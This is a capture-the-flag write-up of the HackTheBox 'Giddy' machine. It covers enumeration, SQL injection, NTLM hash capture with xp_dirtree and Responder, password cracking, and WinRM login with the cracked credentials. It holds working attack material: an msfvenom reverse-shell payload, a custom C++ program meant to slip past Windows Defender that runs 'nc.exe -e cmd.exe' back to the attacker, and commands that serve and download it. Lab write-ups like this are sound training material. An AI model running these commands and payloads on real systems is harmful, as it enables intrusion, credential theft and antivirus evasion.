---
description: Giddy box from HackTheBox write up.
---

# Giddy

## Nmap scan

I run a really basic scan to get all the open ports before this to speed the things a bit:

```bash
┌──(kali㉿kali)-[~/OpenVPN/HTB]
└─$ sudo nmap -sC -sV 10.10.10.104 -p80,443,3389,5985
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-27 13:10 EST
Nmap scan report for 10.10.10.104
Host is up (0.053s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2022-02-27T18:11:07+00:00; +8s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2022-02-27T18:11:04+00:00
|_ssl-date: 2022-02-27T18:11:07+00:00; +8s from scanner time.
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2021-12-14T12:25:29
|_Not valid after:  2022-06-15T12:25:29
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7s, deviation: 0s, median: 7s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.23 seconds
```

Interesting, we have some things here:

- **Ports 80 and 443:** IIS web server.
- **Port 3389:** Remote desktop.
- **Port 5985:** Winrm service.

Obviously this services tell us that this is a Windows box. Let's start checking what we can find.

## IIS web server

Accesing the website just shows a dog photo, I mean that is nice because is a cute dog but not useful to find the flags. Time for a Gobuster scan:

```bash
┌──(kali㉿kali)-[~/OpenVPN/HTB]
└─$ gobuster dir -u http://10.10.10.104/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.104/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/27 13:21:20 Starting gobuster in directory enumeration mode
===============================================================
/remote               (Status: 302) [Size: 157] [--> /Remote/default.aspx?ReturnUrl=%2fremote]
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]                                              
/mvc                  (Status: 301) [Size: 147] [--> http://10.10.10.104/mvc/]                
/*                    (Status: 400) [Size: 3420]
```

In the `/remote` directory we have a login to connect to a Powershell session (Handy if we get valid credentials) and in the `/mvc` directory we can see what looks like a shop or something like that.

The shop allows to check the producs per category using an URL parameter. This parameter, called `ProductSubCategoryId`, is SQL injectable:

```
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18 or 1=1
```

The above URL will display all the products of the database. I guess we can go with SQLMap now to enumerate the database, which is SQL server by the way.

### SQL Server

I used SQLMap to search for something interesting in some of the databases but to be honest was worthless. I could not find any credentials or something that could help with the box but googling a bit I saw something cool.

Using SQLMap I can easily get a DB shell and execute this command:

```
sql-shell> exec master.dbo.xp_dirtree '\\10.10.14.43\anything';
```

What the above command does is connect to a SMB server that I control. Using Responder it is possible to capture the NTLM hash that the SQL Server is gonna use to authenticate to the SMB server:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo responder -I tun0 -v --lm 
...

[+] Listening for events...

[SMB] NTLMv2 Client   : ::ffff:10.10.10.104
[SMB] NTLMv2 Username : GIDDY\Stacy
[SMB] NTLMv2 Hash     : Stacy::GIDDY:ca4e97cd4947f624:FBACC6F993864B9D7FD4C9BF5953D733:0101000000000000A8E1670A132CD80120D522789B1F9AA900000000020000000000000000000000
[SMB] NTLMv2 Client   : ::ffff:10.10.10.104
[SMB] NTLMv2 Username : GIDDY\Stacy
[SMB] NTLMv2 Hash     : Stacy::GIDDY:eb026b7aa03a8007:81BFACFB06B08C65ED16CD768B550BA9:0101000000000000D69B920A132CD8016B32F9AF32F3F4FF00000000020000000000000000000000
```

Notice the last Responder parameter I used, that will make clients use a LM hash intead of NTLM if possible. Since LM hashes are easier to crack using that parameter ease the next steps.

## Foothold

Time for cracking! I will use Jhon for this:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=~/Wordlists/rockyou.txt hash
...

┌──(kali㉿kali)-[~/Desktop]
└─$ john --show hash                                                                                             1 ⨯
Stacy:xNnWo6272k7x:GIDDY:e957fe38a7813b53:136D6064BDCCAB9ECF6A891C41B627E1:0101000000000000E0DE409A0E2CD801FB782F5985F9E8E400000000020000000000000000000000

1 password hash cracked, 0 left
```

And we have credentials! `stacy:xNnWo6272k7x`. Remember the Winrm service? Let's check if we can use it:

```bash
┌──(kali㉿kali)-[~/Desktop/evil-winrm]
└─$ ./evil-winrm.rb -i 10.10.10.104 -u stacy -p xNnWo6272k7x                                                     1 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Stacy\Documents>
```

We are in! It is possible to use the Powershell thing in the web server but I prefer this. The user flag is under `C:\Users\Stacy\Desktop\user.txt`.

## Privesc

There is a file in the documents folder called `unifivideo`. Looks like is part of a program called Ubiquiti UniFi Video:

```bash
┌──(kali㉿kali)-[~/Desktop/evil-winrm]
└─$ searchsploit unifivideo          
Exploits: No Results
Shellcodes: No Results
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/evil-winrm]
└─$ searchsploit Ubiquiti UniFi Video
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Ubiquiti Networks UniFi Video Default - 'crossdomain.xml' Security Bypass          | php/webapps/39268.java
Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation                            | windows/local/43390.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

If the version is old enough we can scalate privileges. The thing is that this program is installed in `C:\ProgramData\unifi-video\` which is world writtable (inherited from `C:\ProgramData` by default) and the service run as Administrator.

When the service starts or stops, it tries to load and execute `C:\ProgramData\unifi-video\taskkill.exe`. The exploit here is that that executable does not exists by default, since we have permissions to modify the `C:\ProgramData\unifi-video\` directory we could inject a malicious program instead.

First I tried to generate the program using `msfvenom`:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.43 LPORT=3000 -f exe > taskkill.exe
```

I uploaded the file to the box using the typical Python server trick and tried the exploit:

```bash
# Atacker
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

# Victim
*Evil-WinRM* PS C:\ProgramData\unifi-video> wget 10.10.14.43:8000/taskkill.exe -outfile taskkill.exe

# Atacker
nc -lnvp 3000
listening on [any] 3000 ...

# Victim
Stop-Service  "Ubiquiti UniFi Video"
Start-Service  "Ubiquiti UniFi Video"
```

To my surprise... nothing happened, the malicious `taskkill.exe` was not in the directory anymore! The culprit here is probably Windows Defender or something similar. Time to create a custom executable to bypass this problem, first I need a way of compiling programs for Windows from Kali and `mingw-w64` is the answer. After that, time to use my C++ skills and craft a malicious program:

```c++
#include<stdlib.h>

int main()
{
	
	system("nc.exe -e cmd.exe 10.10.14.43 3000");
	return 0;
}

```

To compile it `mingw-w64` gives two options:

- **i686-w64-mingw32-gcc:** for 32 bit Windows.
- **x86_64-w64-mingw32-gcc:** for 64 bit Windows.

I went with the 64 bits compiler, if something goes wrong I will use the other:

```bash
x86_64-w64-mingw32-gcc taskkill.cpp -o taskkill.exe
```

I got the Netcat binary from [here](https://github.com/int0x33/nc.exe/blob/master/nc64.exe). Repeating the exploit with the Netcat binary and the malicious `taskkill.exe` worked this time! The root flag is under `C:\Users\Administrator\Desktop\root.txt`.
